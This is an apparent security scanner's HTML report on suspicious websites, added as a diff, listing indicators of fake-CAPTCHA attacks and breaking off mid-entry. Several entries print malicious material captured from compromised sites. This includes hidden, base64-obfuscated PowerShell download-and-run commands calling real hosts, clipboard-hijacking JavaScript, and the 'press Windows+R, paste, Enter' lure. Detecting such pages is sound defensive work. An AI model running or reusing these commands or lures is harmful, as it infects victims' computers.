+            <li><pre>...} function stageClipboard(commandToRun, verification_id){ const suffix =...</pre></li><li><pre>...end = "''" const textToCopy = commandToRun setClipboardCopyData(textToCopy)...</pre></li><li><pre>...extContent = verification_id; const commandToRun = `POWerShEll -W h "[Text.Encoding]::UTF8.GetSt...</pre></li><li><pre>...5Db250ZW50')) | iex"`; stageClipboard(commandToRun, verification_id); } addCaptchaListeners();...</pre></li></ul></div></div>
+        <div class="site suspicious">
+            <h3 class="site-url">https://www.bratusferramentas.grupomoltz.com.br/</h3>
+            <p>
+                <strong>Verdict:</strong> ⚠️ SUSPICIOUS
+                <span class="score-display score-high">Score: 340</span>
+            </p>
+            <p class="total-indicators"><strong>Total Indicators:</strong> 47</p>
+        
+            <div class="indicator">
+                <p class="indicator-title">Base64 Strings (3)</p>
+                <ul>
+            <li><strong>Encoded:</strong> aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS...</li><li><strong>Decoded:</strong> <pre>iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content...</pre></li><li><strong>Contains PowerShell:</strong> Yes ⚠️</li><li><strong>Encoded:</strong> aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS...</li><li><strong>Decoded:</strong> <pre>iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content...</pre></li><li><strong>Contains PowerShell:</strong> Yes ⚠️</li><li><strong>Encoded:</strong> aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS...</li><li><strong>Decoded:</strong> <pre>iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content...</pre></li><li><strong>Contains PowerShell:</strong> Yes ⚠️</li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">PowerShell Commands (3)</p>
+                <ul>
+            <li><pre>POWerShEll -W h "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex"`;</pre></li><li><pre>iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing)</pre></li><li><pre>iwr </pre></li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">Clipboard Manipulation (3)</p>
+                <ul>
+            <li><pre>...tempTextArea.select(); document.execCommand("copy"); document.body.removeChild(tempText...</pre></li><li><pre>...k", function (event) { event.preventDefault(); checkboxBtn.disabled = true; runClickedCheckboxEffects(); }); } } function runClickedCheckboxEffects() { hideCaptchaCheckbox(); setTimeout(function(){ showCaptchaLoading(); },500); setTimeout(function(){ showVerifyWindow(); },900) } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = "visible"; checkboxBtnSpinner.style.opacity = "1"; checkboxBtnSpinner.style.animation = "spin 1s linear infinite"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.opacity = "0"; checkboxBtnSpinner.style.animation = "none"; setTimeout(function() { checkboxBtnSpinner.style.visibility = "hidden"; }, 500); } function hideCaptchaCheckbox() { checkboxBtn.style.visibility = "hidden"; checkboxBtn.style.opacity = "0"; } function showCaptchaCheckbox() { checkboxBtn.style.width = "100%"; checkboxBtn.style.height = "100%"; checkboxBtn.style.borderRadius = "2px"; checkboxBtn.style.margin = "0"; checkboxBtn.style.opacity = "1"; } function hideCaptchaCheckbox() { checkboxBtn.style.width = "4px"; checkboxBtn.style.height = "4px"; checkboxBtn.style.borderRadius = "50%"; checkboxBtn.style.marginLeft = "25px"; checkboxBtn.style.marginTop = "33px"; checkboxBtn.style.opacity = "0"; } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = "visible"; checkboxBtnSpinner.style.opacity = "1"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.visibility = "hidden"; checkboxBtnSpinner.style.opacity = "0"; } function generateRandomNumber() { const min = 1000; const max = 9999; return Math.floor(Math.random() * (max - min + 1) + min).toString(); } function closeverifywindow() { verifywindow.style.display = "none"; verifywindow.style.visibility = "hidden"; verifywindow.style.opacity = "0"; showCaptchaCheckbox(); hideCaptchaLoading(); checkboxBtn.disabled = false; } function isverifywindowVisible() { return verifywindow.style.display !== "none" && verifywindow.style.display !== ""; } function setClipboardCopyData(textToCopy){ const tempTextArea = document.createElement("textarea"); tempTextArea.value = textToCopy; document.body.append(tempTextArea); tempTextArea.select(); document.execCommand("copy"); document.body.removeChild(tempTextArea); } function stageClipboard(commandToRun, verification_id){ const suffix = " # " const ploy = "â ''I am not a robot - reCAPTCHA Verification ID: " const end = "''" const textToCopy = commandToRun setClipboardCopyData(textToCopy); } function showVerifyWindow() {...</pre></li><li><pre>...y.append(tempTextArea); tempTextArea.select(); document.execCommand("copy");...</pre></li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">Clipboard Commands (1)</p>
+                <ul>
+            <li><pre>POWerShEll -W h </pre></li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">CAPTCHA Elements (7)</p>
+                <ul>
+            <li><pre><img src="https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png" class="captcha-logo line-normal" alt=""></pre></li><li><pre>...<div class="overlay" id="overlay"></div> <div class="recaptcha-box"> <h2>Verify You Are Human</h2> <p>Please verify that you are a human to continue.</p> <div class="container m-p"> <div id="checkbox-window" class="checkbox-window m-p block"> <div class="checkbox-container m-p"> <button type="button" id="checkbox" class="checkbox m-p line-normal"></button> </div> <p style="margin: 0 !important;" cla...</pre></li><li><pre>...id="spinner"> </div> <div id="verify-window" class="verify-window"> <div class="verify-container"> <header class="verify-header"> <span class="verify-header-text-medium m-p block">Complete these</span> <span class="verify-header-text-big m-p block">Verification Steps</span> <span class="verify-header-text-medium m-p block"></span> </header> <main class="verify-main"> <p> To better prove you are not a robot, please: </p> <ol> <li> Press & hold the Windows Key <i class="fab fa-windows"></i> + <b>R</b>. </li> <li> In the verification window, press <b>Ctrl</b> + <b>V</b>. </li> <li> Press <b>Enter</b> on your keyboard to finish. </li> </ol> <p> You will observe and agree: <br> <code> â "I am not a robot - reCAPTCHA Verification ID: <span id="verification-id">146820</span>" </code> </p> </main> </div> <footer class="verify-container veri...</pre></li><li><pre><div class="verify-footer-left"> Perform the steps above to finish verification. </div></pre></li><li><pre><title>Verify You Are Human</title></pre></li><li><pre><h2>Verify You Are Human</h2></pre></li><li><pre><p style="margin: 0 !important;" class="im-not-a-robot m-p line-normal">I'm not a robot</p></pre></li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">Suspicious Commands (3)</p>
+                <ul>
+            <li><strong>Type:</strong> PowerShell</li><li><strong>Risk Level:</strong> <span class='risk-high'>High Risk</span></li><li><strong>Command:</strong> <pre>POWerShEll -W h "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex"`;</pre></li><li><strong>Source:</strong> HTML/JavaScript</li><li><strong>Type:</strong> PowerShell</li><li><strong>Risk Level:</strong> <span class='risk-high'>High Risk</span></li><li><strong>Command:</strong> <pre>iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing)</pre></li><li><strong>Source:</strong> HTML/JavaScript</li><li><strong>Type:</strong> PowerShell</li><li><strong>Risk Level:</strong> <span class='risk-medium'>Medium Risk</span></li><li><strong>Command:</strong> <pre>iwr </pre></li><li><strong>Source:</strong> HTML/JavaScript</li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title risk-high">⚠️ High Risk Commands Summary (2)</p>
+                <ul>
+            <li><strong>PowerShell:</strong> <pre>POWerShEll -W h "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4IChpd3IgJ2h0dHBzOi...</pre></li><li><strong>PowerShell:</strong> <pre>iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicPa...</pre></li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">Suspicious Keywords (21)</p>
+                <ul>
+            <li>CAPTCHA Verification</li><li>Verification ID</li><li>I am not a robot</li><li>captcha-box</li><li>captcha-iogo</li><li>captcha</li><li>CAPTCHA-iogo</li><li>CAPTCHA</li><li>CaptchaListeners</li><li>CaptchaCheckbox</li><li>CaptchaLoading</li><li>robot</li><li>Robot</li><li>Verification</li><li>verification</li><li>verification-id</li><li>verification_id</li><li>Verify You Are Human</li><li>To better prove you are not a robot</li><li>iex</li><li>hidden</li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">URLs (2)</p>
+                <ul>
+            <li>https://use.fontawesome.com/releases/v5.0.0/css/all.css</li><li>https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png</li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">Proxy/Security Tool Evasion (4)</p>
+                <ul>
+            <li><pre>...} function stageClipboard(commandToRun, verification_id){ const suffix =...</pre></li><li><pre>...end = "''" const textToCopy = commandToRun setClipboardCopyData(textToCopy)...</pre></li><li><pre>...extContent = verification_id; const commandToRun = `POWerShEll -W h "[Text.Encoding]::UTF8.GetSt...</pre></li><li><pre>...5Db250ZW50')) | iex"`; stageClipboard(commandToRun, verification_id); } addCaptchaListeners();...</pre></li></ul></div></div>
+        <div class="site suspicious">
+            <h3 class="site-url">https://website.mypetapp.co.za/</h3>
+            <p>
+                <strong>Verdict:</strong> ⚠️ SUSPICIOUS
+                <span class="score-display score-high">Score: 340</span>
+            </p>
+            <p class="total-indicators"><strong>Total Indicators:</strong> 47</p>
+        
+            <div class="indicator">
+                <p class="indicator-title">Base64 Strings (3)</p>
+                <ul>
+            <li><strong>Encoded:</strong> aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS...</li><li><strong>Decoded:</strong> <pre>iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content...</pre></li><li><strong>Contains PowerShell:</strong> Yes ⚠️</li><li><strong>Encoded:</strong> aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS...</li><li><strong>Decoded:</strong> <pre>iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content...</pre></li><li><strong>Contains PowerShell:</strong> Yes ⚠️</li><li><strong>Encoded:</strong> aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS...</li><li><strong>Decoded:</strong> <pre>iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content...</pre></li><li><strong>Contains PowerShell:</strong> Yes ⚠️</li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">PowerShell Commands (3)</p>
+                <ul>
+            <li><pre>POWerShEll -W h "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex"`;</pre></li><li><pre>iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing)</pre></li><li><pre>iwr </pre></li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">Clipboard Manipulation (3)</p>
+                <ul>
+            <li><pre>...tempTextArea.select(); document.execCommand("copy"); document.body.removeChild(tempText...</pre></li><li><pre>...k", function (event) { event.preventDefault(); checkboxBtn.disabled = true; runClickedCheckboxEffects(); }); } } function runClickedCheckboxEffects() { hideCaptchaCheckbox(); setTimeout(function(){ showCaptchaLoading(); },500); setTimeout(function(){ showVerifyWindow(); },900) } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = "visible"; checkboxBtnSpinner.style.opacity = "1"; checkboxBtnSpinner.style.animation = "spin 1s linear infinite"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.opacity = "0"; checkboxBtnSpinner.style.animation = "none"; setTimeout(function() { checkboxBtnSpinner.style.visibility = "hidden"; }, 500); } function hideCaptchaCheckbox() { checkboxBtn.style.visibility = "hidden"; checkboxBtn.style.opacity = "0"; } function showCaptchaCheckbox() { checkboxBtn.style.width = "100%"; checkboxBtn.style.height = "100%"; checkboxBtn.style.borderRadius = "2px"; checkboxBtn.style.margin = "0"; checkboxBtn.style.opacity = "1"; } function hideCaptchaCheckbox() { checkboxBtn.style.width = "4px"; checkboxBtn.style.height = "4px"; checkboxBtn.style.borderRadius = "50%"; checkboxBtn.style.marginLeft = "25px"; checkboxBtn.style.marginTop = "33px"; checkboxBtn.style.opacity = "0"; } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = "visible"; checkboxBtnSpinner.style.opacity = "1"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.visibility = "hidden"; checkboxBtnSpinner.style.opacity = "0"; } function generateRandomNumber() { const min = 1000; const max = 9999; return Math.floor(Math.random() * (max - min + 1) + min).toString(); } function closeverifywindow() { verifywindow.style.display = "none"; verifywindow.style.visibility = "hidden"; verifywindow.style.opacity = "0"; showCaptchaCheckbox(); hideCaptchaLoading(); checkboxBtn.disabled = false; } function isverifywindowVisible() { return verifywindow.style.display !== "none" && verifywindow.style.display !== ""; } function setClipboardCopyData(textToCopy){ const tempTextArea = document.createElement("textarea"); tempTextArea.value = textToCopy; document.body.append(tempTextArea); tempTextArea.select(); document.execCommand("copy"); document.body.removeChild(tempTextArea); } function stageClipboard(commandToRun, verification_id){ const suffix = " # " const ploy = "✅ ''I am not a robot - reCAPTCHA Verification ID: " const end = "''" const textToCopy = commandToRun setClipboardCopyData(textToCopy); } function showVerifyWindow() {...</pre></li><li><pre>...y.append(tempTextArea); tempTextArea.select(); document.execCommand("copy");...</pre></li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">Clipboard Commands (1)</p>
+                <ul>
+            <li><pre>POWerShEll -W h </pre></li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">CAPTCHA Elements (7)</p>
+                <ul>
+            <li><pre><img src="https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png" class="captcha-logo line-normal" alt=""></pre></li><li><pre>...<div class="overlay" id="overlay"></div> <div class="recaptcha-box"> <h2>Verify You Are Human</h2> <p>Please verify that you are a human to continue.</p> <div class="container m-p"> <div id="checkbox-window" class="checkbox-window m-p block"> <div class="checkbox-container m-p"> <button type="button" id="checkbox" class="checkbox m-p line-normal"></button> </div> <p style="margin: 0 !important;" cla...</pre></li><li><pre>...id="spinner"> </div> <div id="verify-window" class="verify-window"> <div class="verify-container"> <header class="verify-header"> <span class="verify-header-text-medium m-p block">Complete these</span> <span class="verify-header-text-big m-p block">Verification Steps</span> <span class="verify-header-text-medium m-p block"></span> </header> <main class="verify-main"> <p> To better prove you are not a robot, please: </p> <ol> <li> Press & hold the Windows Key <i class="fab fa-windows"></i> + <b>R</b>. </li> <li> In the verification window, press <b>Ctrl</b> + <b>V</b>. </li> <li> Press <b>Enter</b> on your keyboard to finish. </li> </ol> <p> You will observe and agree: <br> <code> ✅ "I am not a robot - reCAPTCHA Verification ID: <span id="verification-id">146820</span>" </code> </p> </main> </div> <footer class="verify-container veri...</pre></li><li><pre><div class="verify-footer-left"> Perform the steps above to finish verification. </div></pre></li><li><pre><title>Verify You Are Human</title></pre></li><li><pre><h2>Verify You Are Human</h2></pre></li><li><pre><p style="margin: 0 !important;" class="im-not-a-robot m-p line-normal">I'm not a robot</p></pre></li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">Suspicious Commands (3)</p>
+                <ul>
+            <li><strong>Type:</strong> PowerShell</li><li><strong>Risk Level:</strong> <span class='risk-high'>High Risk</span></li><li><strong>Command:</strong> <pre>POWerShEll -W h "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex"`;</pre></li><li><strong>Source:</strong> HTML/JavaScript</li><li><strong>Type:</strong> PowerShell</li><li><strong>Risk Level:</strong> <span class='risk-high'>High Risk</span></li><li><strong>Command:</strong> <pre>iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing)</pre></li><li><strong>Source:</strong> HTML/JavaScript</li><li><strong>Type:</strong> PowerShell</li><li><strong>Risk Level:</strong> <span class='risk-medium'>Medium Risk</span></li><li><strong>Command:</strong> <pre>iwr </pre></li><li><strong>Source:</strong> HTML/JavaScript</li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title risk-high">⚠️ High Risk Commands Summary (2)</p>
+                <ul>
+            <li><strong>PowerShell:</strong> <pre>POWerShEll -W h "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4IChpd3IgJ2h0dHBzOi...</pre></li><li><strong>PowerShell:</strong> <pre>iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicPa...</pre></li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">Suspicious Keywords (21)</p>
+                <ul>
+            <li>CAPTCHA Verification</li><li>Verification ID</li><li>I am not a robot</li><li>captcha-box</li><li>captcha-iogo</li><li>captcha</li><li>CAPTCHA-iogo</li><li>CAPTCHA</li><li>CaptchaListeners</li><li>CaptchaCheckbox</li><li>CaptchaLoading</li><li>robot</li><li>Robot</li><li>Verification</li><li>verification</li><li>verification-id</li><li>verification_id</li><li>Verify You Are Human</li><li>To better prove you are not a robot</li><li>iex</li><li>hidden</li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">URLs (2)</p>
+                <ul>
+            <li>https://use.fontawesome.com/releases/v5.0.0/css/all.css</li><li>https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png</li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">Proxy/Security Tool Evasion (4)</p>
+                <ul>
+            <li><pre>...} function stageClipboard(commandToRun, verification_id){ const suffix =...</pre></li><li><pre>...end = "''" const textToCopy = commandToRun setClipboardCopyData(textToCopy)...</pre></li><li><pre>...extContent = verification_id; const commandToRun = `POWerShEll -W h "[Text.Encoding]::UTF8.GetSt...</pre></li><li><pre>...5Db250ZW50')) | iex"`; stageClipboard(commandToRun, verification_id); } addCaptchaListeners();...</pre></li></ul></div></div>
+        <div class="site ">
+            <h3 class="site-url">https://bmdcompany.com/</h3>
+            <p>
+                <strong>Verdict:</strong> ✅ Likely Safe
+                <span class="score-display score-low">Score: 1</span>
+            </p>
+            <p class="total-indicators"><strong>Total Indicators:</strong> 1</p>
+        
+            <div class="indicator">
+                <p class="indicator-title">URLs (1)</p>
+                <ul>
+            <li>https://t.me/LearnUSDT_bot?start=540835569</li></ul></div></div>
+        <div class="site suspicious">
+            <h3 class="site-url">https://www.test.peperoncinochepassione.it/</h3>
+            <p>
+                <strong>Verdict:</strong> ⚠️ SUSPICIOUS
+                <span class="score-display score-high">Score: 346</span>
+            </p>
+            <p class="total-indicators"><strong>Total Indicators:</strong> 49</p>
+        
+            <div class="indicator">
+                <p class="indicator-title">Base64 Strings (3)</p>
+                <ul>
+            <li><strong>Encoded:</strong> aWV4IChpd3IgJ2h0dHBzOi8vbmljb3N0dWRpby5pdC9wWkpIcX...</li><li><strong>Decoded:</strong> <pre>iex (iwr 'https://nicostudio.it/pZJHqter.txt' -UseBasicParsing).Content...</pre></li><li><strong>Contains PowerShell:</strong> Yes ⚠️</li><li><strong>Encoded:</strong> aWV4IChpd3IgJ2h0dHBzOi8vbmljb3N0dWRpby5pdC9wWkpIcX...</li><li><strong>Decoded:</strong> <pre>iex (iwr 'https://nicostudio.it/pZJHqter.txt' -UseBasicParsing).Content...</pre></li><li><strong>Contains PowerShell:</strong> Yes ⚠️</li><li><strong>Encoded:</strong> aWV4IChpd3IgJ2h0dHBzOi8vbmljb3N0dWRpby5pdC9wWkpIcX...</li><li><strong>Decoded:</strong> <pre>iex (iwr 'https://nicostudio.it/pZJHqter.txt' -UseBasicParsing).Content...</pre></li><li><strong>Contains PowerShell:</strong> Yes ⚠️</li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">PowerShell Commands (3)</p>
+                <ul>
+            <li><pre>PowErsHeLL -W hiddEn "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4IChpd3IgJ2h0dHBzOi8vbmljb3N0dWRpby5pdC9wWkpIcXRlci50eHQnIC1Vc2VCYXNpY1BhcnNpbmcpLkNvbnRlbnQ=')) | iex"`;</pre></li><li><pre>iex (iwr 'https://nicostudio.it/pZJHqter.txt' -UseBasicParsing)</pre></li><li><pre>iwr </pre></li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">Clipboard Manipulation (3)</p>
+                <ul>
+            <li><pre>...tempTextArea.select(); document.execCommand("copy"); document.body.removeChild(tempText...</pre></li><li><pre>...k", function (event) { event.preventDefault(); checkboxBtn.disabled = true; runClickedCheckboxEffects(); }); } } function runClickedCheckboxEffects() { hideCaptchaCheckbox(); setTimeout(function(){ showCaptchaLoading(); },500); setTimeout(function(){ showVerifyWindow(); },900) } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = "visible"; checkboxBtnSpinner.style.opacity = "1"; checkboxBtnSpinner.style.animation = "spin 1s linear infinite"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.opacity = "0"; checkboxBtnSpinner.style.animation = "none"; setTimeout(function() { checkboxBtnSpinner.style.visibility = "hidden"; }, 500); } function hideCaptchaCheckbox() { checkboxBtn.style.visibility = "hidden"; checkboxBtn.style.opacity = "0"; } function showCaptchaCheckbox() { checkboxBtn.style.width = "100%"; checkboxBtn.style.height = "100%"; checkboxBtn.style.borderRadius = "2px"; checkboxBtn.style.margin = "0"; checkboxBtn.style.opacity = "1"; } function hideCaptchaCheckbox() { checkboxBtn.style.width = "4px"; checkboxBtn.style.height = "4px"; checkboxBtn.style.borderRadius = "50%"; checkboxBtn.style.marginLeft = "25px"; checkboxBtn.style.marginTop = "33px"; checkboxBtn.style.opacity = "0"; } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = "visible"; checkboxBtnSpinner.style.opacity = "1"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.visibility = "hidden"; checkboxBtnSpinner.style.opacity = "0"; } function generateRandomNumber() { const min = 1000; const max = 9999; return Math.floor(Math.random() * (max - min + 1) + min).toString(); } function closeverifywindow() { verifywindow.style.display = "none"; verifywindow.style.visibility = "hidden"; verifywindow.style.opacity = "0"; showCaptchaCheckbox(); hideCaptchaLoading(); checkboxBtn.disabled = false; } function isverifywindowVisible() { return verifywindow.style.display !== "none" && verifywindow.style.display !== ""; } function setClipboardCopyData(textToCopy){ const tempTextArea = document.createElement("textarea"); tempTextArea.value = textToCopy; document.body.append(tempTextArea); tempTextArea.select(); document.execCommand("copy"); document.body.removeChild(tempTextArea); } function stageClipboard(commandToRun, verification_id){ const suffix = " # " const ploy = "â ''I am not a robot - reCAPTCHA Verification ID: " const end = "''" const textToCopy = commandToRun setClipboardCopyData(textToCopy); } function showVerifyWindow() {...</pre></li><li><pre>...y.append(tempTextArea); tempTextArea.select(); document.execCommand("copy");...</pre></li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">Clipboard Commands (1)</p>
+                <ul>
+            <li><pre>PowErsHeLL -W hiddEn </pre></li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">CAPTCHA Elements (7)</p>
+                <ul>
+            <li><pre><img src="https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png" class="captcha-logo line-normal" alt=""></pre></li><li><pre>...<div class="overlay" id="overlay"></div> <div class="recaptcha-box"> <h2>Verify You Are Human</h2> <p>Please verify that you are a human to continue.</p> <div class="container m-p"> <div id="checkbox-window" class="checkbox-window m-p block"> <div class="checkbox-container m-p"> <button type="button" id="checkbox" class="checkbox m-p line-normal"></button> </div> <p style="margin: 0 !important;" cla...</pre></li><li><pre>...id="spinner"> </div> <div id="verify-window" class="verify-window"> <div class="verify-container"> <header class="verify-header"> <span class="verify-header-text-medium m-p block">Complete these</span> <span class="verify-header-text-big m-p block">Verification Steps</span> <span class="verify-header-text-medium m-p block"></span> </header> <main class="verify-main"> <p> To better prove you are not a robot, please: </p> <ol> <li> Press & hold the Windows Key <i class="fab fa-windows"></i> + <b>R</b>. </li> <li> In the verification window, press <b>Ctrl</b> + <b>V</b>. </li> <li> Press <b>Enter</b> on your keyboard to finish. </li> </ol> <p> You will observe and agree: <br> <code> â "I am not a robot - reCAPTCHA Verification ID: <span id="verification-id">146820</span>" </code> </p> </main> </div> <footer class="verify-container veri...</pre></li><li><pre><div class="verify-footer-left"> Perform the steps above to finish verification. </div></pre></li><li><pre><title>Verify You Are Human</title></pre></li><li><pre><h2>Verify You Are Human</h2></pre></li><li><pre><p style="margin: 0 !important;" class="im-not-a-robot m-p line-normal">I'm not a robot</p></pre></li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">Suspicious Commands (3)</p>
+                <ul>
+            <li><strong>Type:</strong> PowerShell</li><li><strong>Risk Level:</strong> <span class='risk-high'>High Risk</span></li><li><strong>Command:</strong> <pre>PowErsHeLL -W hiddEn "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4IChpd3IgJ2h0dHBzOi8vbmljb3N0dWRpby5pdC9wWkpIcXRlci50eHQnIC1Vc2VCYXNpY1BhcnNpbmcpLkNvbnRlbnQ=')) | iex"`;</pre></li><li><strong>Source:</strong> HTML/JavaScript</li><li><strong>Type:</strong> PowerShell</li><li><strong>Risk Level:</strong> <span class='risk-high'>High Risk</span></li><li><strong>Command:</strong> <pre>iex (iwr 'https://nicostudio.it/pZJHqter.txt' -UseBasicParsing)</pre></li><li><strong>Source:</strong> HTML/JavaScript</li><li><strong>Type:</strong> PowerShell</li><li><strong>Risk Level:</strong> <span class='risk-medium'>Medium Risk</span></li><li><strong>Command:</strong> <pre>iwr </pre></li><li><strong>Source:</strong> HTML/JavaScript</li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title risk-high">⚠️ High Risk Commands Summary (2)</p>
+                <ul>
+            <li><strong>PowerShell:</strong> <pre>PowErsHeLL -W hiddEn "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4IChpd3IgJ2h0d...</pre></li><li><strong>PowerShell:</strong> <pre>iex (iwr 'https://nicostudio.it/pZJHqter.txt' -UseBasicParsing)</pre></li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">Suspicious Keywords (23)</p>
+                <ul>
+            <li>CAPTCHA Verification</li><li>Verification ID</li><li>I am not a robot</li><li>captcha-box</li><li>captcha-iogo</li><li>captcha</li><li>CAPTCHA-iogo</li><li>CAPTCHA</li><li>CaptchaListeners</li><li>CaptchaCheckbox</li><li>CaptchaLoading</li><li>robot</li><li>Robot</li><li>Verification</li><li>verification</li><li>verification-id</li><li>verification_id</li><li>Verify You Are Human</li><li>To better prove you are not a robot</li><li>PowErsHeLL</li><li>iex</li><li>hidden</li><li>hiddEn</li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">URLs (2)</p>
+                <ul>
+            <li>https://use.fontawesome.com/releases/v5.0.0/css/all.css</li><li>https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png</li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">Proxy/Security Tool Evasion (4)</p>
+                <ul>
+            <li><pre>...} function stageClipboard(commandToRun, verification_id){ const suffix =...</pre></li><li><pre>...end = "''" const textToCopy = commandToRun setClipboardCopyData(textToCopy)...</pre></li><li><pre>...extContent = verification_id; const commandToRun = `PowErsHeLL -W hiddEn "[Text.Encoding]::UTF8....</pre></li><li><pre>...NvbnRlbnQ=')) | iex"`; stageClipboard(commandToRun, verification_id); } addCaptchaListeners();...</pre></li></ul></div></div>
+        <div class="site ">
+            <h3 class="site-url">https://82.146.62.232/</h3>
+            <p>
+                <strong>Verdict:</strong> ✅ Likely Safe
+                <span class="score-display score-high">Score: 393</span>
+            </p>
+            <p class="total-indicators"><strong>Total Indicators:</strong> 74</p>
+        
+            <div class="indicator">
+                <p class="indicator-title">Base64 Strings (46)</p>
+                <ul>
